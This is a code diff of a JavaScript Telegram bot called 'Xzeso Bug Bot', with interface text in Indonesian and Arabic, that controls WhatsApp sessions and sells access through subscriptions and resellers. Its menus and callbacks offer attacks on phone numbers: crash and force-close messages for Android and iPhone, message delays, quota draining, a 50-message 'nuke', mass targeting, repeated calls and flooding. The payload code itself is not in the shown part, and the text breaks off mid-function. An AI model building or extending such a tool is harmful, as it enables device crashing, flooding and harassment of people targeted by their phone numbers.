-bot.command("setcd", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    const args = ctx.message.text.split(" ");
-    const cmdName = args[1];
-    const minutes = parseInt(args[2]);
-
-    if (!cmdName || isNaN(minutes)) {
-      return ctx.reply(
-        "👀 *Usage:* /setcd <command> <minutes>\n" +
-        "Contoh: /setcd Xzesoandro 30\n\n" +
-        "📌 Cooldown akan berlaku untuk command tersebut.",
-        { parse_mode: "Markdown" }
-      );
-    }
-
-    const result = cooldown.setCooldown(cmdName, minutes);
-    await ctx.reply(result.message);
-    
-  } catch (e) {
-    log.error(`SETCD ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan saat mengatur cooldown.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /free
-// =====================================================================
-
-bot.command("free", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");
-
-    settingsDb.freeMode = !settingsDb.freeMode;
+    settingsDb.admins = settingsDb.admins.filter(a => a !== target);
+    delete settingsDb.permissions[target];
     safeWriteJSON("./database/settings.json", settingsDb);
-
-    if (settingsDb.freeMode) {
-      ctx.reply("🟢 *Free Mode Active*\nAll users can now use all commands.", { parse_mode: "Markdown" });
-    } else {
-      ctx.reply("🔒 *Free Mode nonaktifkan*\nOnly premium users owner reseller can use the bot If you want to buy premium DM Owner @I8_ZU", { parse_mode: "Markdown" });
-    }
-  } catch (e) {
-    log.error(`FREE ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan saat mengaktifkan free mode.");
-  }
+    ctx.reply(`🗑 تم حذف المسؤول: ${target}`);
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// Access Management Commands
+// COMMAND: /listadmin (List Admins)
 // =====================================================================
 
-bot.command("addacces", async (ctx) => {
+bot.command("listadmin", async (ctx) => {
   try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya owner & reseller!");
+    if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للمالك فقط!");
 
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    if (!target) return ctx.reply("⚠️ Use /addacces <userId>");
-
-    const access = safeReadJSON("./storage/access.json", { users: [] });
-    if (access.users.includes(target)) return ctx.reply("⚠️ User sudah memiliki access!");
-
-    access.users.push(target);
-    safeWriteJSON("./storage/access.json", access);
-
-    ctx.reply(`✅ Access ditambahkan untuk ${target}`);
-  } catch (e) {
-    log.error(`ADDACCES ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan.");
-  }
-});
-
-bot.command("delacces", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya owner & reseller!");
-
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    if (!target) return ctx.reply("⚠️ Use /delacces <userId>");
-
-    let access = safeReadJSON("./storage/access.json", { users: [] });
-    access.users = access.users.filter(x => x !== target);
-    safeWriteJSON("./storage/access.json", access);
-
-    ctx.reply(`🗑 Access user ${target} dihapus`);
-  } catch (e) {
-    log.error(`DELACCES ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan.");
-  }
-});
-
-bot.command("listacces", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya owner & reseller!");
-
-    const access = safeReadJSON("./storage/access.json", { users: [] });
-    if (access.users.length < 1) return ctx.reply("📭 List access kosong");
-
-    ctx.reply(`📌 List Access:\n${access.users.map(x => `• ${x}`).join("\n")}`);
-  } catch (e) {
-    log.error(`LISTACCES ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan.");
-  }
-});
-
-bot.command("address", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");
-
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    if (!target) return ctx.reply("⚠️ Use /address <userId>");
-
-    const resellers = safeReadJSON("./storage/resellers.json", { users: [] });
-    if (!resellers.users.includes(target)) {
-      resellers.users.push(target);
-      safeWriteJSON("./storage/resellers.json", resellers);
-      ctx.reply(`🟢 Reseller ditambahkan: ${target}`);
-    } else {
-      ctx.reply(`⚠️ ${target} sudah menjadi reseller.`);
-    }
-  } catch (e) {
-    log.error(`ADDRESS ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan.");
-  }
-});
-
-bot.command("delress", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");
-
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    if (!target) return ctx.reply("⚠️ Use /delress <userId>");
-
-    let resellers = safeReadJSON("./storage/resellers.json", { users: [] });
-    resellers.users = resellers.users.filter(x => x !== target);
-    safeWriteJSON("./storage/resellers.json", resellers);
-
-    ctx.reply(`🔴 Reseller dihapus: ${target}`);
-  } catch (e) {
-    log.error(`DELRESS ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan.");
-  }
-});
-
-bot.command("listress", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");
-
-    const resellers = safeReadJSON("./storage/resellers.json", { users: [] });
-    if (resellers.users.length < 1) return ctx.reply("📭 List reseller kosong");
-
-    ctx.reply(`📌 List Reseller:\n${resellers.users.map(x => `• ${x}`).join("\n")}`);
-  } catch (e) {
-    log.error(`LISTRESS ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan.");
-  }
+    const admins = settingsDb.admins || [];
+    let text = "👥 <b>قائمة المسؤولين:</b>\n\n";
+    admins.forEach((a, i) => { text += `${i + 1}. ${a}\n` });
+    if (admins.length === 0) text += "📭 لا يوجد مسؤولون";
+    await ctx.reply(text, { parse_mode: "HTML" });
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// Broadcast Command
+// COMMAND: /listcodes (List Subscription Codes)
+// =====================================================================
+
+bot.command("listcodes", async (ctx) => {
+  try {
+    if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للمالك فقط!");
+
+    const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+    let text = "🎫 <b>قائمة الرموز:</b>\n\n";
+    db.codes.forEach(c => {
+      text += `${c.used ? "✅" : "❌"} <code>${c.code}</code> - ${c.hours} ساعة\n`;
+    });
+    if (db.codes.length === 0) text += "📭 لا توجد رموز";
+    await ctx.reply(text, { parse_mode: "HTML" });
+  } catch (e) { ctx.reply("❌ خطأ"); }
+});
+
+// =====================================================================
+// COMMAND: /broadcast (Broadcast)
 // =====================================================================
 
 bot.command("broadcast", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya reseller yang bisa akses!");
+    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ مخصص للملك والموزعين!");
 
-    const args = ctx.message.text.split(" ");
-    const msg = args.slice(1).join(" ");
-    if (!msg) return ctx.reply("⚠️ Use /broadcast <pesan>");
+    const msg = ctx.message.text.split(" ").slice(1).join(" ");
+    if (!msg) return ctx.reply("⚠️ الاستخدام: <code>/broadcast رسالة</code>");
 
-    const users = safeReadJSON("database/users.json", []);
-    log.loading(`Broadcasting message to ${chalk.yellow(users.length)} users...`);
-
-    let ok = 0, fail = 0;
-    for (const id of users) {
-      try {
-        await ctx.api.sendMessage(id, msg);
-        ok++;
-      } catch {
-        fail++;
-      }
+    let sent = 0, failed = 0;
+    for (const id of usersDb) {
+      try { await bot.api.sendMessage(id, msg); sent++; } catch { failed++; }
     }
-
-    log.success(`Broadcast completed: ${chalk.green(ok)} sent, ${chalk.red(fail)} failed`);
-    ctx.reply(`✅ Sent: ${ok}\n❌ Failed: ${fail}`);
-  } catch (e) {
-    log.error(`BROADCAST ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan saat broadcast.");
-  }
+    ctx.reply(`✅ تم الإرسال: ${sent}\n❌ فشل: ${failed}`, { parse_mode: "HTML" });
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// Callback Handlers
+// CALLBACK HANDLERS
 // =====================================================================
 
-bot.callbackQuery("open_allmenu", async (ctx) => {
-  try {
-    await ctx.answerCallbackQuery();
-
-    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
-    const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-
-    const caption = `
-<blockquote>
-<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>
-
-<b>「 Xzeso Vip Bug V1  ☇ 」</b>
-••► Owner: @I8_ZU
-••► Run Time: ${uptime}
-••► Memory: ${usedMemory}
-••► InterFace: Button Type
-••► Type: ( Plugin )
-
-You've successfully connected to the official bot of <b>adji pgstu</b>
-Explore the tools and commands below. 🔥 Choose one of the menus below to begin your journey.
-
-📢 <b>Stay Connected</b>
-Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.
-
-<b>📞 Support</b>
-Contact @I8_ZU for assistance
-</blockquote>`.trim();
-
-    const keyboard = new InlineKeyboard()
-      .text("BUG DELAY", "bug_spam")
-      .text("BUG FORCE CLOSE", "bug_crash")
-      .row()
-      .text("🔥 bàck-máin", "back_to_main");
-
-    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-    await ctx.editMessageMedia(
-      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
-      { reply_markup: keyboard }
-    );
-  } catch (error) {
-    log.error(`Error in open_allmenu: ${error.message}`);
-    await ctx.answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true }).catch(() => {});
-  }
-});
-
-bot.callbackQuery("open_allaccess", async (ctx) => {
-  try {
-    await ctx.answerCallbackQuery();
-
-    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
-    const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-
-    const caption = `
-<blockquote>
-<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>
-
-<b>「  Xzeso Vip Bug V1 ☇ 」</b>
-••► Owner: @I8_ZU
-••► Run Time: ${uptime}
-••► Memory: ${usedMemory}
-••► InterFace: Button Type
-••► Type: ( Plugin )
-
-<b> All Access Menu</b>
-- clearsesi
-- reqpair
-- broadcast
-- checkbio
-- listpair
-- addacces
-- address
-- delacces
-- listaccess
-- cdon
-- cdoff
-- setcd
-
-📢 <b>Stay Connected</b>
-Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.
-
-<b>📞 Support</b>
-Contact @I8_ZU for assistance
-</blockquote>
-`.trim();
-
-    const keyboard = new InlineKeyboard()
-      .text("𝘽𝙐𝙂 𝘿𝙀𝙇𝘼𝙔", "bug_spam")
-      .text("🎭 forceclose", "bug_crash")
-      .row()
-      .text("🔥 bàck-máin", "back_to_main");
-
-    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-    await ctx.editMessageMedia(
-      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
-      { reply_markup: keyboard }
-    );
-  } catch (error) {
-    log.error(`Error in open_allaccess: ${error.message}`);
-    await ctx.answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true }).catch(() => {});
-  }
-});
-
-bot.callbackQuery("bug_crash", async (ctx) => {
-  try {
-    await ctx.answerCallbackQuery();
-
-    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
-    const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-
-    const caption = `<blockquote>
-<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>
-
-<b>「  Xzeso Vip Bug V1 ☇」</b>
-••► Owner: @I8_ZU
-••► Run Time: ${uptime}
-••► Memory: ${usedMemory}
-••► InterFace: Button Type
-••► Type: ( Plugin )
-
-<b> Bug Crash Menu</b>
-
-[ android blank+ui visible ]
-- Uixzeso number
-ᚖ example : /Uixzeso 628xxx
-
-[ force close andro invisible ]
-{ bug not work for beta }
-- Xzesoandro number
-ᚖ example : /Xzesoandro 628xxx
-
-[ force close andro infinity ]
-bug not work for beta
-- Droidx number
-ᚖ example : /Droidx 628xxx
-
-[ force close 1 msg work beta ]
-- Betaxzeso number
-ᚖ example : /Betaxzeso 628xxx
-
-[ iphone crash ]
-- Xzesoiosx number
-ᚖ example : /Xzesoiosx 628xxx
-
-📢 <b>Stay Connected</b>
-Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.
-
-<b>📞 Support</b>
-Contact @I8_ZU for assistance
-</blockquote>`.trim();
-
-    const keyboard = new InlineKeyboard().text("⬅️ Kembali", "open_allmenu");
-    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-    await ctx.editMessageMedia(
-      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
-      { reply_markup: keyboard }
-    );
-  } catch (error) {
-    log.error(`Error in bug_crash: ${error.message}`);
-  }
-});
-// =====================================================================
-// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
-// =====================================================================
-// PART 6/7: Lines 3251-3900
-// Total: ~4550 Lines
-// =====================================================================
-
-// =====================================================================
-// Callback Handlers (Continued)
-// =====================================================================
-
-bot.callbackQuery("bug_spam", async (ctx) => {
-  try {
-    await ctx.answerCallbackQuery();
-
-    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
-    const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-
-    const caption = `<blockquote>
-<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>
-
-<b>「 Xzeso Vip Bug V1  ☇ 」</b>
-••► Owner: @I8_ZU
-••► Run Time: ${uptime}
-••► Memory: ${usedMemory}
-••► InterFace: Button Type
-••► Type: ( Plugin )
-
-[ android delayed ]
-- Delayxzeso number
-ᚖ example : /Delayxzeso 628xxx
-
-[ android delay beta ]
-- Betaxzosex number
-ᚖ example : /Betaxzosex 628xxx
-
-[ android suck up quota ]
-- Xzesox number
-ᚖ example : /Xzesox 628xxx
-
-[ android stuck message ]
-- invisisendx number
-ᚖ example : /invisisendx 628xxx
-
-📢 <b>Stay Connected</b>
-Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.
-
-<b>📞 Support</b>
-Contact @I8_ZU for assistance
-</blockquote>`.trim();
-
-    const keyboard = new InlineKeyboard().text("⬅️ Kembali", "open_allmenu");
-    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-    await ctx.editMessageMedia(
-      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
-      { reply_markup: keyboard }
-    );
-  } catch (error) {
-    log.error(`Error in bug_spam: ${error.message}`);
-  }
-});
-
+// Back to main menu
 bot.callbackQuery("back_to_main", async (ctx) => {
   try {
     await ctx.answerCallbackQuery();
+    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
+    const caption = `<blockquote><b>👋 أهلاً ${userDisplay}!</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━\n🔥 <b>Xzeso Bug Bot V6.0</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n📢 اختر من القائمة:</blockquote>`;
 
-    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
-    const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-
-    const caption = `<blockquote>
-<b><i>{❓} Xinsoo say hello ${username}</i></b>
-
-<b>「  Xzeso Vip Bug V1 ☇ 」</b>
-••► Owner: @I8_ZU
-••► Run Time: ${uptime}
-••► Memory: ${usedMemory}
-••► InterFace: Button Type
-••► Type: ( Plugin )
-
-📢 <b>Stay Connected</b>
-Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.
-
-<b>📞 Support</b>
-Contact @I8_ZU for assistance
-</blockquote>`.trim();
-
-    const keyboard = new InlineKeyboard()
-      .text("🦠 ćrashër", "open_allmenu")
-      .text("🧩 aćcęss", "open_allaccess")
-      .row()
-      .url("👀 ćhannal", `https://t.me/${CHANNEL_ID.replace("@", "")}`);
-
-    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-    await ctx.editMessageMedia(
-      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
-      { reply_markup: keyboard }
+    await ctx.editMessageText(caption, { parse_mode: "HTML", reply_markup: getMainMenuKeyboard() }
     );
-  } catch (error) {
-    log.error(`Error in back_to_main: ${error.message}`);
+  } catch (e) { log.error(`back_to_main error: ${e.message}`); }
+});
+
+// Main Menu buttons
+bot.callbackQuery("menu_attacks", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText("🔥 <b>أوامر الهجوم</b>\n\nاختر نوع الهجوم:", { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("menu_sessions", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText("📱 <b>الجلسات والأرقام</b>\n\nإدارة جلسات الواتساب:", { parse_mode: "HTML", reply_markup: getSessionsKeyboard() }
+  );
+});
+
+bot.callbackQuery("menu_settings", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText("⚙️ <b>الإعدادات</b>\n\nاضبط إعدادات البوت:", { parse_mode: "HTML", reply_markup: getSettingsKeyboard() }
+  );
+});
+
+bot.callbackQuery("menu_subscriptions", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText("🎫 <b>الاشتراكات</b>\n\nإنشاء وإدارة رموز الاشتراك:", { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard() }
+  );
+});
+
+bot.callbackQuery("menu_developer", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText("👨‍💻 <b>المطور</b>\n\nأدوات المطور والإحصائيات:", { parse_mode: "HTML", reply_markup: getDeveloperKeyboard() }
+  );
+});
+
+bot.callbackQuery("menu_free", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const status = isFreeMode() ? "✅ مفعل" : "❌ معطل";
+  await ctx.editMessageText(
+    `🆓 <b>الوضع المجاني</b>\n\nالحالة الحالية: ${status}\n\n${isFreeMode() ? "✅ جميع المستخدمين يمكنهم استخدام البوت" : "🔒 فقط المستخدمين المدفوعين"}`,
+    { parse_mode: "HTML" }
+  );
+});
+
+bot.callbackQuery("menu_maintenance", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const status = isMaintenance() ? "✅ مفعل" : "❌ معطل";
+  await ctx.editMessageText(
+    `🛠️ <b>وضع الصيانة</b>\n\nالحالة: ${status}\n\n${isMaintenance() ? `📝 الرسالة: ${settingsDb.maintenanceMsg}` : "🛠️ فعّل الصيانة لإعلام المستخدمين"}`,
+    { parse_mode: "HTML" }
+  );
+});
+
+// Settings buttons
+bot.callbackQuery("set_bot_image", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const currentImage = getBotImageUrl();
+  await ctx.editMessageText(
+    `🖼️ <b>صورة البوت</b>\n\nالرابط الحالي: ${currentImage}\n\nاستخدم <code>/setbotpic رابط_جديد</code> لتغييرها`,
+    { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("⬅️ رجوع", "back_to_main") }
+  );
+});
+
+bot.callbackQuery("toggle_free_mode", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
+  await ctx.answerCallbackQuery();
+
+  settingsDb.freeMode = !settingsDb.freeMode;
+  safeWriteJSON("./database/settings.json", settingsDb);
+  await ctx.editMessageText(
+    `🆓 <b>الوضع المجاني</b>\n\n${settingsDb.freeMode ? "✅ مفعل - جميع المستخدمين يمكنهم استخدام البوت" : "❌ معطل - فقط المدفوعين"}`,
+    { parse_mode: "HTML", reply_markup: getSettingsKeyboard() }
+  );
+});
+
+bot.callbackQuery("toggle_maintenance", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
+  await ctx.answerCallbackQuery();
+
+  settingsDb.maintenance = !settingsDb.maintenance;
+  safeWriteJSON("./database/settings.json", settingsDb);
+
+  if (settingsDb.maintenance) {
+    for (const uid of usersDb) {
+      try { await bot.api.sendMessage(uid, `🛠️ <b>البوت في وضع الصيانة</b>\n\n${settingsDb.maintenanceMsg}`, { parse_mode: "HTML" }); } catch {}
+    }
   }
+
+  await ctx.editMessageText(
+    `🛠️ <b>الصيانة</b>\n\n${settingsDb.maintenance ? "✅ مفعل" : "❌ معطل"}\n\n${settingsDb.maintenance ? `📝 ${settingsDb.maintenanceMsg}` : ""}`,
+    { parse_mode: "HTML", reply_markup: getSettingsKeyboard() }
+  );
+});
+
+// Admin buttons
+bot.callbackQuery("menu_admins", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const admins = settingsDb.admins || [];
+  await ctx.editMessageText(
+    `👥 <b>إدارة المسؤولين</b>\n\nالمسؤولون (${admins.length}):\n${admins.map((a, i) => `${i + 1}. ${a}`).join("\n") || "📭 لا يوجد"}`,
+    { parse_mode: "HTML", reply_markup: getAdminKeyboard() }
+  );
+});
+
+bot.callbackQuery("admin_add", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "👥 <b>إضافة مسؤول</b>\n\nاستخدم الأمر: <code>/addadmin 123456789</code>",
+    { parse_mode: "HTML", reply_markup: getAdminKeyboard() }
+  );
+});
+
+bot.callbackQuery("admin_remove", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "👥 <b>حذف مسؤول</b>\n\nاستخدم الأمر: <code>/deladmin 123456789</code>",
+    { parse_mode: "HTML", reply_markup: getAdminKeyboard() }
+  );
+});
+
+bot.callbackQuery("admin_list", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const admins = settingsDb.admins || [];
+  const text = admins.length > 0
+    ? `👥 <b>المسؤولون:</b>\n\n${admins.map((a, i) => `${i + 1}. ${a}`).join("\n")}`
+    : "📭 لا يوجد مسؤولون";
+  await ctx.editMessageText(text, { parse_mode: "HTML", reply_markup: getAdminKeyboard() });
+});
+
+bot.callbackQuery("admin_codes", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🎫 <b>إدارة رموز الاشتراك</b>\n\nاستخدم <code>/makencode ساعات</code> لإنشاء رمز\nاستخدم <code>/listcodes</code> لعرض الرموز",
+    { parse_mode: "HTML", reply_markup: getAdminKeyboard() }
+  );
+});
+
+// Developer buttons
+bot.callbackQuery("dev_stats", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const uptime = formatUptime(process.uptime());
+  const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+  await ctx.editMessageText(
+    `📊 <b>الإحصائيات</b>\n\n⏱️ التشغيل: ${uptime}\n💾 الذاكرة: ${memUsed} MB\n👥 المستخدمين: ${usersDb.length}\n📱 الجلسات: ${Object.keys(waClients).length}`,
+    { parse_mode: "HTML", reply_markup: getDeveloperKeyboard() }
+  );
+});
+
+bot.callbackQuery("dev_tools", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🔧 <b>أدوات المطور</b>\n\n• /ping - اختبار السرعة\n• /botinfo - معلومات البوت\n• /stats - الإحصائيات\n• /broadcast - بث رسالة\n\n⬅️ رجوع",
+    { parse_mode: "HTML", reply_markup: getDeveloperKeyboard() }
+  );
+});
+
+bot.callbackQuery("dev_logs", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const logsDb = safeReadJSON("./storage/logs.json", []);
+  const recentLogs = logsDb.slice(-10).reverse() || [];
+  const text = recentLogs.length > 0
+    ? recentLogs.map(l => `• ${l}`).join("\n")
+    : "📭 لا توجد سجلات";
+  await ctx.editMessageText(`📋 <b>السجلات</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getDeveloperKeyboard() });
+});
+
+// Subscription buttons
+bot.callbackQuery("sub_create", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🎫 <b>إنشاء رمز اشتراك</b>\n\nاستخدم: <code>/makencode 24</code>\nلإنشاء رمز لمدة 24 ساعة",
+    { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard() }
+  );
+});
+
+bot.callbackQuery("sub_list", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+  const text = db.codes.length > 0
+    ? db.codes.map(c => `${c.used ? "✅" : "❌"} <code>${c.code}</code> - ${c.hours} ساعة`).join("\n")
+    : "📭 لا توجد رموز";
+  await ctx.editMessageText(`🎫 <b>قائمة الرموز</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard() });
+});
+
+bot.callbackQuery("sub_redeem", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🔑 <b>تفعيل رمز</b>\n\nاستخدم: <code>/redeem XZ-ABCD12</code>",
+    { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard() }
+  );
+});
+
+bot.callbackQuery("sub_active", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
+  const active = Object.entries(subsDb.users).filter(([, v]) => v.expiresAt > Date.now());
+  const text = active.length > 0
+    ? active.map(([id, v]) => `• ${id}: ${Math.ceil((v.expiresAt - Date.now()) / 3600000)} ساعة متبقية`).join("\n")
+    : "📭 لا توجد اشتراكات نشطة";
+  await ctx.editMessageText(`⏰ <b>الاشتراكات النشطة</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard() });
+});
+
+// Sessions buttons
+bot.callbackQuery("sess_list", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const sessions = Object.entries(waClients).filter(([, v]) => v.status === "open");
+  const text = sessions.length > 0
+    ? sessions.map(([id, v]) => `• ${id}: ✅ ${new Date(v.lastActivity).toLocaleString()}`).join("\n")
+    : "📭 لا توجد جلسات";
+  await ctx.editMessageText(`📋 <b>الجلسات النشطة</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getSessionsKeyboard() });
+});
+
+bot.callbackQuery("sess_new", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "➕ <b>جلسة جديدة</b>\n\nاستخدم: <code>/reqpair 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getSessionsKeyboard() }
+  );
+});
+
+bot.callbackQuery("sess_clear", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للملك فقط!", { show_alert: true });
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "⚠️ <b>حذف جميع الجلسات</b>\n\nهل أنت متأكد؟",
+    { parse_mode: "HTML",
+      reply_markup: new InlineKeyboard()
+        .text("✅ نعم", "confirm_clear_all")
+        .text("❌ لا", "back_to_main")
+    }
+  );
+});
+
+bot.callbackQuery("confirm_clear_all", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await clearAllSessions();
+  await ctx.editMessageText("✅ تم حذف جميع الجلسات!", { parse_mode: "HTML", reply_markup: getSessionsKeyboard() });
+});
+
+bot.callbackQuery("sess_stats", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const total = Object.keys(waClients).length;
+  const active = Object.entries(waClients).filter(([, v]) => v.status === "open").length;
+  await ctx.editMessageText(`📊 <b>إحصائيات الجلسات</b>\n\n📱 الإجمالي: ${total}\n✅ النشطة: ${active}`, { parse_mode: "HTML", reply_markup: getSessionsKeyboard() });
+});
+
+// Attack buttons
+bot.callbackQuery("attack_nuke", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "💥 <b>هجوم نووي</b>\n\nيرسل 50 رسالة متتالية للهدف.\n\nاستخدم: <code>/nuke 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_mass", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🎯 <b>هجوم متعدد</b>\n\nيستهدف أكثر من رقم في نفس الوقت.\n\nاستخدم: <code>/mass 628xxx,628yyy</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_call", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "📞 <b>قرصنة صوتية</b>\n\nإرسال مكالمات صوتية متكررة.\n\nاستخدم: <code>/call 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_flood", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
